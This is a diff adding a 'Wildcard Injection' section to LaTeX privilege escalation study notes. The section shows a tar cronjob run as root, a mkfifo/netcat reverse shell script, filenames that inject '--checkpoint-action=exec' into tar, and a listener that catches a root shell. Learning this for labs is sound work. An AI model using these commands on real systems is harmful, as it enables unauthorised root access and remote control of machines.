@@ -153,7 +153,22 @@ To check what we can run as SUID:
 \begin{lstlisting}
 	find / -perm -u=s -type f 2>/dev/null
 \end{lstlisting}
-
+\subsection{Wildcard Injection}
+If there is a command using wildcard that is automatically executed by the target (cronjob as root) it may be vulnerable to wildcard injection.\\
+To demonstrate this we assume that there is a tar cronjob that archives every file in a writable folder with the wildcard *.
+\begin{lstlisting}
+	*/2 * * * * *	root tar -zcf /var/backups/docs.tgz /home/user/Documents/*
+\end{lstlisting}
+We now can create some files to modify the tar command and execute a reverse shell with it:
+\begin{lstlisting}
+	echo "mkfifo /tmp/lhennp; nc $IP 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
+	echo "" > "--checkpoint-action=exec=sh shell.sh"
+	echo "" > --checkpoint=1
+\end{lstlisting}
+We can catch the reverse shell with a netcat listener on our machine and we have root!
+\begin{lstlisting}
+	nc -lnvp 8888
+\end{lstlisting}
 privilege escalation is such a large topic that it would be impossible to do it proper justice in this type of room. However, it is a necessary topic that must be covered, so rather than making a task with questions, I shall provide you all with some resources.
 
 General:
